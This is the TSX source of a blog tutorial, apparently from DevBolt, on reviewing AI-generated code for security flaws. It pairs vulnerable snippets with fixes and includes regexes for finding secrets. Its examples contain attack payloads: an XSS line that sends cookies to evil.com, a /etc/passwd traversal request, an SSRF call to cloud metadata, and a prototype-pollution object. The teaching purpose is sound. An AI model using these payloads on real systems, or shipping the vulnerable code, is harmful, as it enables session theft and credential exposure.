import Link from "next/link";

function Code({ children }: { children: React.ReactNode }) {
  return (
    <code className="rounded bg-gray-100 px-1.5 py-0.5 text-sm font-mono text-indigo-600 dark:bg-gray-800 dark:text-indigo-400">
      {children}
    </code>
  );
}

function CodeBlock({ children, title }: { children: string; title?: string }) {
  return (
    <div className="my-6 overflow-hidden rounded-lg border border-gray-200 dark:border-gray-800">
      {title && (
        <div className="border-b border-gray-200 bg-gray-50 px-4 py-2 text-xs font-medium text-gray-500 dark:border-gray-800 dark:bg-gray-900 dark:text-gray-400">
          {title}
        </div>
      )}
      <pre className="overflow-x-auto bg-gray-50 p-4 text-sm leading-relaxed dark:bg-gray-900">
        <code className="font-mono text-gray-800 dark:text-gray-200">
          {children}
        </code>
      </pre>
    </div>
  );
}

function Callout({ children }: { children: React.ReactNode }) {
  return (
    <div className="my-6 rounded-lg border-l-4 border-amber-400 bg-amber-50 p-4 text-sm text-amber-800 dark:border-amber-600 dark:bg-amber-900/20 dark:text-amber-200">
      {children}
    </div>
  );
}

export default function VibeCodingSecurity() {
  return (
    <>
      <p className="text-lg text-gray-600 dark:text-gray-400">
        &quot;Vibe coding&quot; — using AI to generate entire features from
        natural language prompts — is how millions of developers ship code in
        2026. But Veracode&apos;s 2025 State of Software Security report found
        that <strong>45% of AI-generated code contains at least one
        vulnerability</strong>. Copilot, Cursor, Claude, and ChatGPT all
        produce code that compiles, passes tests, and ships with SQL injection,
        hardcoded secrets, or missing auth checks baked in. This guide walks
        through a practical, step-by-step security review process for any
        AI-generated code before it reaches production.
      </p>

      <Callout>
        Want to scan code automatically? Paste your AI-generated code into
        DevBolt&apos;s{" "}
        <Link
          href="/tools/code-security-scanner"
          className="font-medium text-amber-700 underline hover:text-amber-600 dark:text-amber-300 dark:hover:text-amber-200"
        >
          AI Code Security Scanner
        </Link>{" "}
        for instant vulnerability detection — 25 rules across 10 categories,
        with CWE references and fix guidance. 100% client-side.
      </Callout>

      {/* ── Why AI Code Needs Review ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Why AI-Generated Code Is a Security Risk
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        AI models learn from millions of open-source repositories — including
        code with known vulnerabilities, outdated patterns, and insecure
        defaults. They optimize for &quot;code that works,&quot; not &quot;code
        that is secure.&quot; Common problems include:
      </p>
      <ul className="mt-4 space-y-3 text-gray-600 dark:text-gray-400">
        <li className="flex items-start gap-2">
          <span className="text-red-500 mt-0.5 font-bold">1.</span>
          <span>
            <strong className="text-gray-900 dark:text-white">
              Hardcoded secrets
            </strong>{" "}
            — AI often generates placeholder API keys, database passwords, and
            JWT secrets directly in the code instead of reading from environment
            variables.
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-red-500 mt-0.5 font-bold">2.</span>
          <span>
            <strong className="text-gray-900 dark:text-white">
              Missing input validation
            </strong>{" "}
            — generated endpoints frequently accept and process user input
            without sanitization, creating injection vectors.
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-red-500 mt-0.5 font-bold">3.</span>
          <span>
            <strong className="text-gray-900 dark:text-white">
              Insecure defaults
            </strong>{" "}
            — <Code>CORS: *</Code>, <Code>Math.random()</Code> for tokens,{" "}
            <Code>eval()</Code> for parsing, JWT without verification, HTTP
            instead of HTTPS.
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-red-500 mt-0.5 font-bold">4.</span>
          <span>
            <strong className="text-gray-900 dark:text-white">
              Overly complex logic
            </strong>{" "}
            — AI tends to produce deeply nested, high-complexity functions that
            are harder to review and more likely to hide bugs.
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-red-500 mt-0.5 font-bold">5.</span>
          <span>
            <strong className="text-gray-900 dark:text-white">
              Outdated patterns
            </strong>{" "}
            — models trained on older code may use deprecated APIs, weak
            cryptographic algorithms (MD5, SHA-1), or patterns that were
            acceptable years ago but are exploitable today.
          </span>
        </li>
      </ul>

      {/* ── Step 1: Scan for Known Vulnerability Patterns ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Step 1: Scan for Known Vulnerability Patterns
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        Before reading the code manually, run it through an automated scanner.
        This catches the low-hanging fruit — hardcoded secrets, dangerous
        functions, and common anti-patterns — in seconds.
      </p>
      <p className="mt-4 text-gray-600 dark:text-gray-400">
        Use DevBolt&apos;s{" "}
        <Link
          href="/tools/code-security-scanner"
          className="text-indigo-600 hover:text-indigo-500 dark:text-indigo-400 dark:hover:text-indigo-300"
        >
          AI Code Security Scanner
        </Link>{" "}
        to paste your code and get an instant report. Here is what a typical
        AI-generated API handler looks like when scanned:
      </p>
      <CodeBlock title="Vulnerable AI-generated code">
        {`// AI-generated Express endpoint
app.post("/api/users", async (req, res) => {
  const { email, password, role } = req.body;

  // Hardcoded secret (CWE-798)
  const API_KEY = "sk-proj-abc123def456";

  // SQL injection (CWE-89)
  const user = await db.query(
    \`SELECT * FROM users WHERE email = '\${email}'\`
  );

  // Weak hashing (CWE-328)
  const hash = crypto.createHash("md5").update(password).digest("hex");

  // Missing auth check — anyone can set role to "admin"
  await db.query(
    \`INSERT INTO users (email, password, role) VALUES ('\${email}', '\${hash}', '\${role}')\`
  );

  // Insecure token generation (CWE-330)
  const token = Math.random().toString(36).slice(2);

  res.json({ token });
});`}
      </CodeBlock>
      <p className="text-gray-600 dark:text-gray-400">
        A scanner would flag at least 5 issues here: the hardcoded API key,
        two SQL injection points, MD5 hashing for passwords, and{" "}
        <Code>Math.random()</Code> for token generation. Every one of these is
        a real vulnerability that AI assistants routinely produce.
      </p>

      {/* ── Step 2: Check for Hardcoded Secrets ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Step 2: Check for Hardcoded Secrets and Credentials
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        This is the single most common vulnerability in AI-generated code. AI
        models frequently generate placeholder credentials that look real and
        get committed to repositories. Search for these patterns:
      </p>
      <CodeBlock title="Patterns to search for">
        {`# API keys and tokens
/sk-[a-zA-Z0-9]{20,}/     # OpenAI-style keys
/AKIA[0-9A-Z]{16}/         # AWS access keys
/ghp_[a-zA-Z0-9]{36}/      # GitHub personal access tokens
/secret.*=.*["'][^"']+/i    # Generic secret assignments

# Database credentials
/mongodb(\+srv)?:\/\/\w+:\w+@/  # MongoDB connection strings
/postgres:\/\/\w+:\w+@/         # PostgreSQL connection strings
/password\s*[:=]\s*["'][^"']+/  # Password assignments`}
      </CodeBlock>
      <p className="mt-4 text-gray-600 dark:text-gray-400">
        <strong className="text-gray-900 dark:text-white">The fix:</strong>{" "}
        Replace every hardcoded credential with an environment variable. Use{" "}
        <Link
          href="/tools/env-validator"
          className="text-indigo-600 hover:text-indigo-500 dark:text-indigo-400 dark:hover:text-indigo-300"
        >
          DevBolt&apos;s .env Validator
        </Link>{" "}
        to verify your <Code>.env</Code> file has no exposed secrets and
        matches your <Code>.env.example</Code>.
      </p>
      <CodeBlock title="Before (insecure)">
        {`const JWT_SECRET = "super-secret-key-123";
const DB_URL = "postgres://admin:password@localhost/mydb";`}
      </CodeBlock>
      <CodeBlock title="After (secure)">
        {`const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) throw new Error("JWT_SECRET not configured");

const DB_URL = process.env.DATABASE_URL;
if (!DB_URL) throw new Error("DATABASE_URL not configured");`}
      </CodeBlock>

      {/* ── Step 3: Validate All User Inputs ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Step 3: Validate All User Inputs
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        AI-generated code frequently trusts user input implicitly. Every value
        that comes from a request body, query parameter, URL path, or header
        must be validated before use. Look for:
      </p>
      <ul className="mt-4 space-y-2 text-gray-600 dark:text-gray-400">
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            Direct string interpolation in SQL queries (<Code>{"`${req.body.id}`"}</Code>)
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            <Code>eval()</Code> or <Code>new Function()</Code> with user input
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            <Code>innerHTML</Code> or <Code>dangerouslySetInnerHTML</Code> with
            unsanitized data
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            File paths constructed from user input (<Code>fs.readFile(req.params.file)</Code>)
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            URLs built from user input passed to <Code>fetch()</Code> (SSRF)
          </span>
        </li>
      </ul>
      <CodeBlock title="Before (SQL injection)">
        {`// AI-generated — vulnerable to SQL injection
app.get("/api/users/:id", async (req, res) => {
  const user = await db.query(
    \`SELECT * FROM users WHERE id = '\${req.params.id}'\`
  );
  res.json(user.rows[0]);
});`}
      </CodeBlock>
      <CodeBlock title="After (parameterized query)">
        {`// Secure — parameterized query prevents injection
app.get("/api/users/:id", async (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) return res.status(400).json({ error: "Invalid ID" });

  const user = await db.query(
    "SELECT * FROM users WHERE id = $1",
    [id]
  );
  res.json(user.rows[0]);
});`}
      </CodeBlock>

      {/* ── Step 4: Review Auth ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Step 4: Review Authentication and Authorization
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        AI-generated auth code is notoriously fragile. Common issues include:
      </p>
      <ul className="mt-4 space-y-2 text-gray-600 dark:text-gray-400">
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            <strong className="text-gray-900 dark:text-white">JWT without verification:</strong>{" "}
            code that decodes tokens using <Code>jwt.decode()</Code> instead of{" "}
            <Code>jwt.verify()</Code>, meaning anyone can forge tokens
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            <strong className="text-gray-900 dark:text-white">Algorithm confusion:</strong>{" "}
            accepting <Code>alg: &quot;none&quot;</Code> or mixing HMAC/RSA
            algorithms, allowing signature bypass
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            <strong className="text-gray-900 dark:text-white">Missing role checks:</strong>{" "}
            endpoints that authenticate the user but never verify they have
            permission for the specific action
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            <strong className="text-gray-900 dark:text-white">Insecure cookies:</strong>{" "}
            session cookies missing <Code>httpOnly</Code>, <Code>secure</Code>,
            or <Code>sameSite</Code> attributes
          </span>
        </li>
      </ul>
      <CodeBlock title="Before (JWT decode without verify)">
        {`// AI-generated — decodes JWT without verifying signature!
const payload = jwt.decode(token);
if (payload.userId) {
  // Trusts unverified data — anyone can craft a fake token
  const user = await getUser(payload.userId);
}`}
      </CodeBlock>
      <CodeBlock title="After (proper JWT verification)">
        {`// Secure — verifies signature with explicit algorithm
try {
  const payload = jwt.verify(token, process.env.JWT_SECRET, {
    algorithms: ["HS256"],  // Explicit algorithm prevents confusion attacks
    maxAge: "1h",
  });
  const user = await getUser(payload.userId);
} catch (err) {
  return res.status(401).json({ error: "Invalid token" });
}`}
      </CodeBlock>
      <p className="mt-4 text-gray-600 dark:text-gray-400">
        Use DevBolt&apos;s{" "}
        <Link
          href="/tools/jwt-decoder"
          className="text-indigo-600 hover:text-indigo-500 dark:text-indigo-400 dark:hover:text-indigo-300"
        >
          JWT Decoder
        </Link>{" "}
        to inspect token headers and payloads, and the{" "}
        <Link
          href="/tools/jwt-builder"
          className="text-indigo-600 hover:text-indigo-500 dark:text-indigo-400 dark:hover:text-indigo-300"
        >
          JWT Builder
        </Link>{" "}
        to test signing with different algorithms.
      </p>

      {/* ── Step 5: Check for XSS ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Step 5: Check for Cross-Site Scripting (XSS)
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        AI-generated frontend code regularly uses <Code>innerHTML</Code> or{" "}
        <Code>dangerouslySetInnerHTML</Code> to render dynamic content.
        This creates XSS vulnerabilities where attackers can inject scripts:
      </p>
      <CodeBlock title="Before (XSS via innerHTML)">
        {`// AI-generated React component — XSS vulnerability
function UserComment({ comment }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: comment.body }} />
  );
}

// If comment.body contains: <img src=x onerror="document.location='https://evil.com?c='+document.cookie">
// The attacker steals the user's session cookie`}
      </CodeBlock>
      <CodeBlock title="After (safe rendering)">
        {`// Secure — render text content, not HTML
function UserComment({ comment }) {
  return <div>{comment.body}</div>;
}

// If you MUST render HTML, sanitize it first:
import DOMPurify from "dompurify";

function UserComment({ comment }) {
  const clean = DOMPurify.sanitize(comment.body);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}`}
      </CodeBlock>

      {/* ── Step 6: Audit Dependencies ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Step 6: Audit Dependencies and Imports
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        AI models sometimes suggest packages that are deprecated, unmaintained,
        or have known vulnerabilities. When AI generates an{" "}
        <Code>npm install</Code> or <Code>import</Code> statement, verify:
      </p>
      <ul className="mt-4 space-y-2 text-gray-600 dark:text-gray-400">
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            The package exists and is actively maintained (check npm weekly downloads and last publish date)
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            Run <Code>npm audit</Code> after installing to check for known
            vulnerabilities
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            The package name is correct — AI sometimes hallucinates package names
            that don&apos;t exist, and typosquatters register malicious packages
            with similar names
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-orange-500">•</span>
          <span>
            Consider whether you need the dependency at all — AI tends to
            import heavy libraries for tasks achievable with built-in APIs
          </span>
        </li>
      </ul>
      <CodeBlock title="Common AI dependency mistakes">
        {`# AI suggests deprecated crypto library
npm install crypto  # ❌ Use built-in Node.js crypto module

# AI suggests request (deprecated since 2020)
npm install request  # ❌ Use fetch() (built into Node 18+)

# AI hallucinates a package name
npm install express-validator-plus  # ❌ Package doesn't exist
npm install express-validator       # ✓ The real package`}
      </CodeBlock>

      {/* ── Step 7: Test Error Handling ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Step 7: Test Error Handling for Information Leakage
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        AI-generated error handling frequently leaks internal details — stack
        traces, database schemas, file paths, and environment information —
        that help attackers map your application.
      </p>
      <CodeBlock title="Before (information leakage)">
        {`app.use((err, req, res, next) => {
  // AI-generated error handler leaks everything
  console.log("Error:", err);
  res.status(500).json({
    error: err.message,
    stack: err.stack,         // Leaks internal file paths
    query: err.sql,           // Leaks database query
    config: app.get("config") // Leaks server configuration
  });
});`}
      </CodeBlock>
      <CodeBlock title="After (safe error handling)">
        {`app.use((err, req, res, next) => {
  // Log full error internally for debugging
  console.error("Internal error:", err);

  // Return generic message to client
  res.status(500).json({
    error: "An internal error occurred",
    requestId: req.id,  // Correlate with server logs
  });
});`}
      </CodeBlock>

      {/* ── Step 8: Measure Code Complexity ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Step 8: Measure Code Complexity
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        AI-generated code often has high cyclomatic and cognitive complexity —
        deeply nested conditionals, long functions, and convoluted logic. High
        complexity is a <em>leading indicator</em> of bugs, including security
        bugs. Functions with cyclomatic complexity above 10 are statistically
        more likely to contain defects.
      </p>
      <p className="mt-4 text-gray-600 dark:text-gray-400">
        Paste your AI-generated code into DevBolt&apos;s{" "}
        <Link
          href="/tools/code-complexity-analyzer"
          className="text-indigo-600 hover:text-indigo-500 dark:text-indigo-400 dark:hover:text-indigo-300"
        >
          Code Complexity Analyzer
        </Link>{" "}
        to get per-function metrics. Focus on functions flagged as
        &quot;High&quot; or &quot;Very High&quot; risk — these are the ones most
        likely to hide bugs and should be refactored before shipping.
      </p>
      <p className="mt-4 text-gray-600 dark:text-gray-400">
        Target these thresholds per function:
      </p>
      <ul className="mt-4 space-y-2 text-gray-600 dark:text-gray-400">
        <li className="flex items-start gap-2">
          <span className="text-emerald-500">•</span>
          <span>
            <strong className="text-gray-900 dark:text-white">Cyclomatic complexity:</strong>{" "}
            keep under 10. Above 20 means refactor immediately.
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-emerald-500">•</span>
          <span>
            <strong className="text-gray-900 dark:text-white">Cognitive complexity:</strong>{" "}
            keep under 15. Above 25 means the function is too hard to review reliably.
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="text-emerald-500">•</span>
          <span>
            <strong className="text-gray-900 dark:text-white">Nesting depth:</strong>{" "}
            keep under 4 levels. Use guard clauses and early returns to flatten.
          </span>
        </li>
      </ul>

      {/* ── Prevention Checklist ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        The Vibe Coding Security Checklist
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        Run through this checklist every time you ship AI-generated code:
      </p>
      <div className="my-6 overflow-hidden rounded-lg border border-gray-200 dark:border-gray-800">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-gray-200 bg-gray-50 dark:border-gray-800 dark:bg-gray-900">
              <th className="px-4 py-3 text-left font-semibold text-gray-700 dark:text-gray-300">
                Check
              </th>
              <th className="px-4 py-3 text-left font-semibold text-gray-700 dark:text-gray-300">
                What to Look For
              </th>
              <th className="px-4 py-3 text-left font-semibold text-gray-700 dark:text-gray-300">
                Tool
              </th>
            </tr>
          </thead>
          <tbody className="text-gray-600 dark:text-gray-400">
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="px-4 py-3 font-medium">Secrets</td>
              <td className="px-4 py-3">API keys, passwords, tokens in source</td>
              <td className="px-4 py-3">
                <Link
                  href="/tools/code-security-scanner"
                  className="text-indigo-600 dark:text-indigo-400"
                >
                  Security Scanner
                </Link>
              </td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="px-4 py-3 font-medium">Injection</td>
              <td className="px-4 py-3">SQL, NoSQL, command, LDAP injection</td>
              <td className="px-4 py-3">
                <Link
                  href="/tools/code-security-scanner"
                  className="text-indigo-600 dark:text-indigo-400"
                >
                  Security Scanner
                </Link>
              </td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="px-4 py-3 font-medium">XSS</td>
              <td className="px-4 py-3">innerHTML, dangerouslySetInnerHTML</td>
              <td className="px-4 py-3">
                <Link
                  href="/tools/code-security-scanner"
                  className="text-indigo-600 dark:text-indigo-400"
                >
                  Security Scanner
                </Link>
              </td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="px-4 py-3 font-medium">Auth</td>
              <td className="px-4 py-3">JWT verify, role checks, cookie flags</td>
              <td className="px-4 py-3">
                <Link
                  href="/tools/jwt-decoder"
                  className="text-indigo-600 dark:text-indigo-400"
                >
                  JWT Decoder
                </Link>
              </td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="px-4 py-3 font-medium">Complexity</td>
              <td className="px-4 py-3">CC &gt; 10, nesting &gt; 4, long functions</td>
              <td className="px-4 py-3">
                <Link
                  href="/tools/code-complexity-analyzer"
                  className="text-indigo-600 dark:text-indigo-400"
                >
                  Complexity Analyzer
                </Link>
              </td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="px-4 py-3 font-medium">Dependencies</td>
              <td className="px-4 py-3">
                <Code>npm audit</Code>, deprecated packages
              </td>
              <td className="px-4 py-3">npm CLI</td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="px-4 py-3 font-medium">Error handling</td>
              <td className="px-4 py-3">Stack traces, SQL queries in responses</td>
              <td className="px-4 py-3">Manual review</td>
            </tr>
            <tr>
              <td className="px-4 py-3 font-medium">Env config</td>
              <td className="px-4 py-3">.env structure, missing vars</td>
              <td className="px-4 py-3">
                <Link
                  href="/tools/env-validator"
                  className="text-indigo-600 dark:text-indigo-400"
                >
                  .env Validator
                </Link>
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      {/* ── Prompting for Secure Code ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        How to Prompt AI for More Secure Code
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        You can significantly reduce the number of vulnerabilities in
        AI-generated code by being explicit about security requirements in your
        prompts. Instead of:
      </p>
      <CodeBlock title="Vague prompt (produces insecure code)">
        {`"Write an Express endpoint to create a user"`}
      </CodeBlock>
      <p className="mt-4 text-gray-600 dark:text-gray-400">
        Use a structured prompt with explicit security constraints:
      </p>
      <CodeBlock title="Security-aware prompt">
        {`"Write an Express POST endpoint to create a user.
Requirements:
- Use parameterized queries (no string interpolation in SQL)
- Read secrets from environment variables only
- Validate all inputs with express-validator
- Hash passwords with bcrypt (cost factor 12+)
- Return generic error messages (no stack traces)
- Set httpOnly, secure, sameSite cookies
- Rate limit to 5 requests per minute per IP
- Use TypeScript with strict mode"`}
      </CodeBlock>
      <p className="mt-4 text-gray-600 dark:text-gray-400">
        DevBolt&apos;s{" "}
        <Link
          href="/tools/prompt-builder"
          className="text-indigo-600 hover:text-indigo-500 dark:text-indigo-400 dark:hover:text-indigo-300"
        >
          AI Prompt Template Builder
        </Link>{" "}
        has pre-built templates for code review and security-focused
        prompts that you can customize for your use case.
      </p>

      {/* ── Real-World Examples ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Real-World Vulnerabilities Found in AI Code
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        These are actual vulnerability patterns that security researchers have
        found in AI-generated code across popular assistants:
      </p>

      <h3 className="mt-8 mb-3 text-xl font-semibold text-gray-900 dark:text-white">
        1. Prototype Pollution
      </h3>
      <CodeBlock title="AI-generated object merge — prototype pollution">
        {`// AI often generates recursive merge functions like this:
function deepMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = target[key] || {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];  // No __proto__ check!
    }
  }
  return target;
}

// Attacker sends: { "__proto__": { "isAdmin": true } }
// Now EVERY object in the app has isAdmin === true`}
      </CodeBlock>
      <CodeBlock title="Fixed version">
        {`function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    // Block prototype pollution
    if (key === "__proto__" || key === "constructor" || key === "prototype") {
      continue;
    }
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = target[key] || {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}`}
      </CodeBlock>

      <h3 className="mt-8 mb-3 text-xl font-semibold text-gray-900 dark:text-white">
        2. Path Traversal
      </h3>
      <CodeBlock title="AI-generated file server — path traversal">
        {`// AI-generated static file handler
app.get("/files/:name", (req, res) => {
  const filePath = path.join(__dirname, "uploads", req.params.name);
  res.sendFile(filePath);
});

// Attacker requests: GET /files/../../etc/passwd
// Server sends the system password file`}
      </CodeBlock>
      <CodeBlock title="Fixed version">
        {`app.get("/files/:name", (req, res) => {
  const safeName = path.basename(req.params.name); // Strip directory traversal
  const filePath = path.join(__dirname, "uploads", safeName);

  // Extra safety: verify the resolved path is still inside uploads/
  if (!filePath.startsWith(path.join(__dirname, "uploads"))) {
    return res.status(403).json({ error: "Access denied" });
  }

  res.sendFile(filePath);
});`}
      </CodeBlock>

      <h3 className="mt-8 mb-3 text-xl font-semibold text-gray-900 dark:text-white">
        3. SSRF (Server-Side Request Forgery)
      </h3>
      <CodeBlock title="AI-generated URL fetcher — SSRF vulnerability">
        {`// AI-generated webhook handler
app.post("/api/webhook", async (req, res) => {
  const { callbackUrl } = req.body;

  // Fetches ANY URL the user provides — including internal services!
  const response = await fetch(callbackUrl);
  const data = await response.json();

  res.json(data);
});

// Attacker sends: { "callbackUrl": "http://169.254.169.254/latest/meta-data/" }
// Server responds with AWS instance credentials`}
      </CodeBlock>
      <CodeBlock title="Fixed version">
        {`import { URL } from "url";

const ALLOWED_HOSTS = ["api.example.com", "hooks.slack.com"];

app.post("/api/webhook", async (req, res) => {
  const { callbackUrl } = req.body;

  try {
    const parsed = new URL(callbackUrl);

    // Block internal IPs and restrict to HTTPS
    if (parsed.protocol !== "https:") {
      return res.status(400).json({ error: "HTTPS required" });
    }
    if (!ALLOWED_HOSTS.includes(parsed.hostname)) {
      return res.status(400).json({ error: "Host not allowed" });
    }

    const response = await fetch(callbackUrl);
    const data = await response.json();
    res.json(data);
  } catch {
    res.status(400).json({ error: "Invalid URL" });
  }
});`}
      </CodeBlock>

      {/* ── Conclusion ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Ship Fast, but Ship Safe
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        Vibe coding is not going away — it makes developers faster, and the
        tools keep improving. The solution is not to stop using AI for code
        generation, but to build a security review habit into your workflow.
        Scan every AI-generated function before committing. Check for secrets,
        injection, auth flaws, and complexity. Use structured prompts that
        include security requirements.
      </p>
      <p className="mt-4 text-gray-600 dark:text-gray-400">
        The entire review process takes 5 minutes per feature. That is 5
        minutes between &quot;AI wrote my code&quot; and &quot;my code is in
        production with a SQL injection vulnerability.&quot;
      </p>

      {/* ── Affiliate Callout (DigitalOcean) ── */}
      <div className="my-12 rounded-xl border border-blue-200 bg-blue-50/50 p-6 dark:border-blue-900 dark:bg-blue-950/30">
        <p className="text-sm font-semibold text-blue-900 dark:text-blue-300">
          Deploying AI-generated code to production?
        </p>
        <p className="mt-2 text-sm text-blue-800 dark:text-blue-400">
          <a
            href="https://www.digitalocean.com/products/app-platform"
            target="_blank"
            rel="noopener sponsored"
            className="font-medium underline hover:no-underline"
          >
            DigitalOcean App Platform
          </a>{" "}
          auto-deploys from Git with built-in container security scanning,
          environment variable management, and DDoS protection — so your
          infrastructure is secure even if your code needs work. Start free,
          scale when ready.
        </p>
      </div>
    </>
  );
}
